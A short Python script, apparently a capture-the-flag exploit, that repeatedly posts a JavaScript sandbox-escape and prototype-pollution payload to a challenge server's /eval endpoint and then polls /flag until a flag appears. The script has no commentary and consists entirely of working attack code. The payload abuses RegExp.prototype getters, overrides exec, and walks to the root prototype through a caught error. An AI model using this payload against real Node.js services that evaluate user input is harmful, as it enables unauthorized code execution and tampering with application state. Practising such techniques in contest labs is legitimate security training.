import requests

while True:
	url='http://e98bf3bc-c396-4802-819f-c0bfa407ec7f.node4.buuoj.cn:81/eval'
	data={
	'e':'''1;function getRootPrototype(obj) {        
    while (obj.__proto__) {
        obj = obj.__proto__;
    }
    return obj;    
}
function stack(ref, cb) {
    let stack = new Error().stack;
    stack.match(/checkReferenceRecursive/g);        
}
try {            
    global.temp0 = RegExp.prototype.__defineGetter__('global', () => {    
        getRootPrototype(this);                
        stack(this);        
        return true;
    }), function functionInvocationAnalysis(r) {        
        stack(r);
    }(temp0), global.temp0;
    RegExp.prototype.exec = function (str) {        
        stack(arguments);        
    };    
} catch (e) {    
    getRootPrototype(e).as=[1,2,3];  
module.exports=Object.keys(Object.prototype)
}'''
	}
	proxies = { "http": None, "https": None}
	resp=requests.post(url=url,data=data,proxies=proxies)
	print(resp.status_code)
	print(resp.text)
	url='http://e98bf3bc-c396-4802-819f-c0bfa407ec7f.node4.buuoj.cn:81/flag'
	resp1=requests.get(url=url,proxies=proxies)
	print(resp1.status_code)
	print(resp1.text)
	if 'flag' in resp1.text:
		print(resp1.text)
		break;